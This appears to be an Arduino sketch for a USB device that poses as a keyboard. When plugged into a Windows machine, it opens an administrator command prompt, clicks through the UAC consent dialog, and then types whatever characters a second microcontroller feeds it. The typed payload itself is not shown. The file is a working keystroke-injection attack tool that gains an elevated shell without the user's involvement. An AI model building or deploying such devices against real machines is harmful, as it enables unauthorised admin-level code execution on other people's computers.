#include "Keyboard.h"
#include "HID.h"

int complete = 0;

// runs on the atemega16u
void setup() {
  // serial 1 is incoming from the atmega328p
  Serial1.begin(115200);
  // use the HID library to appear as an HID device
  Keyboard.begin();
  // serial will show up on serial monitor like normal
  Serial.begin(115200);
   
}

void loop() {
  // run once when plugged in
  if (!complete) {
    complete = 1;
    delay(1000);
    // open an administrator command prompt
    // open windows menu
    Keyboard.write(KEY_LEFT_GUI);
    delay(100); // windows is slow
  
    // delays are necessary because windows has animations etc. that mess it up
    // search for cmd
    Keyboard.print("cmd");
    delay(200);
    
    // run as admin
    Keyboard.press(KEY_LEFT_CTRL);
    delay(100);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(50);
    Keyboard.releaseAll();
    delay(2000);
    
    // select yes
    Keyboard.write(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(500);
  
    // focus cmd
    Keyboard.press(KEY_LEFT_GUI);
    delay(200);
    Keyboard.write(KEY_TAB);
    delay(100);
    Keyboard.write(KEY_TAB);
    delay(100);
    Keyboard.releaseAll();
    delay(2000);

    Serial.println("opened a cmd window");
    Serial1.write('g'); // go signal for other chip
  } else  if (Serial1.available()) {
    // mirror out bytes from serial (incoming from main chip with more memory)
    // get a byte
    char c = Serial1.read();
    // send a fake keypress that matches the character
    Keyboard.print(c);
  }
  
}
